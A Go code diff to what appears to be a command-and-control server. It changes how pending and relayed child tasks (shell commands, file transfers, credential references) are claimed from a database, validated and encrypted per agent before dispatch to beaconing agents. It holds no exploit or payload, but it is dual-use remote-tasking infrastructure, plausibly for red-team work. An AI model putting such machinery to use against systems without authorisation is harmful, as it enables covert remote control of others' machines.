@@ -47,7 +47,7 @@ func (s *Server) fetchPendingTasks(uuid string, limits ...int) []task {
 				// builder re-encrypts them with the session key below.
 				// "offset" is double-quoted: it is a reserved word in
 				// PostgreSQL and MySQL-style backticks are a syntax error there.
-				Select("id, type, command, shell, path, data, \"offset\", size, prev_mac, mac, task_key").
+				Select("id, type, command, shell, path, data, \"offset\", size, prev_mac, mac, task_key, credential_id, credential_fingerprint, resolved_command, resolved_shell, transfer_id, direction, final, result_sha256, expected_sha256").
 				Where("agent_id = ? AND status = ?", uuid, "pending").
 				Where("NOT (type = ? AND (mac = '' OR mac IS NULL))", "upload").
 				Order("priority DESC, created_at ASC").
@@ -73,7 +73,7 @@ func (s *Server) fetchPendingTasks(uuid string, limits ...int) []task {
 				if result.RowsAffected < int64(len(ids)) {
 					slog.Debug("Some tasks already claimed by concurrent connection", "agent_id", uuid, "attempted", len(ids), "claimed", result.RowsAffected)
 				}
-				if err := tx.Select("id, type, command, shell, path, data, \"offset\", size, prev_mac, mac, task_key").Where("id IN ? AND status = ? AND claimed_by = ?", ids, "running", uuid).
+				if err := tx.Select("id, type, command, shell, path, data, \"offset\", size, prev_mac, mac, task_key, credential_id, credential_fingerprint, resolved_command, resolved_shell, transfer_id, direction, final, result_sha256, expected_sha256").Where("id IN ? AND status = ? AND claimed_by = ?", ids, "running", uuid).
 					Order("priority DESC, created_at ASC").Limit(len(ids)).Find(&claimedTasks).Error; err != nil {
 					return err
 				}
@@ -89,7 +89,7 @@ func (s *Server) fetchPendingTasks(uuid string, limits ...int) []task {
 				for _, ct := range claimedTasks {
 					claimedIDs = append(claimedIDs, ct.ID)
 				}
-				q := tx.Select("id, type, command, shell, path, data, \"offset\", size, prev_mac, mac, task_key").Where("agent_id = ? AND status = ? AND claimed_by = ? AND acknowledged_at IS NULL", uuid, "running", uuid)
+				q := tx.Select("id, type, command, shell, path, data, \"offset\", size, prev_mac, mac, task_key, credential_id, credential_fingerprint, resolved_command, resolved_shell, transfer_id, direction, final, result_sha256, expected_sha256").Where("agent_id = ? AND status = ? AND claimed_by = ? AND acknowledged_at IS NULL", uuid, "running", uuid)
 				if len(claimedIDs) > 0 {
 					q = q.Where("id NOT IN ?", claimedIDs)
 				}
@@ -113,23 +113,38 @@ func (s *Server) fetchPendingTasks(uuid string, limits ...int) []task {
 		slog.Debug("Beacon fetching pending tasks", "agent_id", uuid, "pending_count", 0)
 	}
 
-	tasks := make([]task, len(claimedTasks))
-	for i, t := range claimedTasks {
+	tasks := make([]task, 0, len(claimedTasks))
+	for _, t := range claimedTasks {
+		if t.CredentialID != nil {
+			if err := validateCredentialSnapshot(s.db, t); err != nil {
+				s.failCredentialSnapshot(t)
+				continue
+			}
+		}
+		command, shell, err := taskWireArgs(t)
+		if err != nil {
+			slog.Error("Cannot dispatch task with unresolved arguments", "agent_id", uuid, "task_id", t.ID, "error", err)
+			continue
+		}
 		wire := task{
-			ID:      t.ID,
-			Type:    t.Type,
-			Command: t.Command,
-			Shell:   t.Shell,
-			Path:    t.Path,
-			Data:    t.Data,
-			Offset:  t.Offset,
-			Size:    t.Size,
-			PrevMAC: t.PrevMAC,
-			MAC:     t.MAC,
-			Key:     t.TaskKey,
+			ID:             t.ID,
+			Type:           t.Type,
+			Command:        command,
+			Shell:          shell,
+			Path:           t.Path,
+			Data:           t.Data,
+			Offset:         t.Offset,
+			Size:           t.Size,
+			PrevMAC:        t.PrevMAC,
+			MAC:            t.MAC,
+			Key:            t.TaskKey,
+			TransferID:     t.TransferID,
+			Direction:      t.Direction,
+			Final:          t.Final,
+			ExpectedSHA256: t.ExpectedSHA256,
 		}
 		encryptTaskPayload(s, uuid, &wire)
-		tasks[i] = wire
+		tasks = append(tasks, wire)
 	}
 	return tasks
 }
@@ -217,7 +232,7 @@ func (s *Server) fetchRelayedChildTasks(parentUUID string) []relayedTask {
 				// Dispatch columns only, same as fetchPendingTasks: result/error
 				// blobs never reach the wire and their AfterFind decrypt is pure
 				// waste per claimed child task. agent_id is needed for grouping.
-				Select("id, agent_id, type, command, shell, path, data, \"offset\", size, prev_mac, mac, task_key").
+				Select("id, agent_id, type, command, shell, path, data, \"offset\", size, prev_mac, mac, task_key, credential_id, credential_fingerprint, resolved_command, resolved_shell, transfer_id, direction, final, result_sha256, expected_sha256").
 				Where("agent_id IN ? AND status = ?", childIDs, "pending").
 				Where("NOT (type = ? AND (mac = '' OR mac IS NULL))", "upload").
 				Order("priority DESC, created_at ASC").
@@ -256,7 +271,7 @@ func (s *Server) fetchRelayedChildTasks(parentUUID string) []relayedTask {
 					q = q.Where("id NOT IN ?", claimedIDs)
 				}
 				unacked := make([]db.Task, 0, beaconDispatchPrealloc)
-				if err := q.Select("id, agent_id, type, command, shell, path, data, \"offset\", size, prev_mac, mac, task_key").
+				if err := q.Select("id, agent_id, type, command, shell, path, data, \"offset\", size, prev_mac, mac, task_key, credential_id, credential_fingerprint, resolved_command, resolved_shell, transfer_id, direction, final, result_sha256, expected_sha256").
 					Order("claimed_at ASC").Limit(remaining).Find(&unacked).Error; err != nil {
 					return err
 				}
@@ -284,18 +299,33 @@ func (s *Server) fetchRelayedChildTasks(parentUUID string) []relayedTask {
 		}
 		rt := relayedTask{AgentID: childID}
 		for _, t := range tasks {
+			if t.CredentialID != nil {
+				if err := validateCredentialSnapshot(s.db, t); err != nil {
+					s.failCredentialSnapshot(t)
+					continue
+				}
+			}
+			command, shell, err := taskWireArgs(t)
+			if err != nil {
+				slog.Error("Cannot dispatch relayed task with unresolved arguments", "agent_id", childID, "task_id", t.ID, "error", err)
+				continue
+			}
 			wire := task{
-				ID:      t.ID,
-				Type:    t.Type,
-				Command: t.Command,
-				Shell:   t.Shell,
-				Path:    t.Path,
-				Data:    t.Data,
-				Offset:  t.Offset,
-				Size:    t.Size,
-				PrevMAC: t.PrevMAC,
-				MAC:     t.MAC,
-				Key:     t.TaskKey,
+				ID:             t.ID,
+				Type:           t.Type,
+				Command:        command,
+				Shell:          shell,
+				Path:           t.Path,
+				Data:           t.Data,
+				Offset:         t.Offset,
+				Size:           t.Size,
+				PrevMAC:        t.PrevMAC,
+				MAC:            t.MAC,
+				Key:            t.TaskKey,
+				TransferID:     t.TransferID,
+				Direction:      t.Direction,
+				Final:          t.Final,
+				ExpectedSHA256: t.ExpectedSHA256,
 			}
 			// Child tasks travel inside the parent's response, so their
 			// sensitive fields are encrypted with the CHILD's session key.
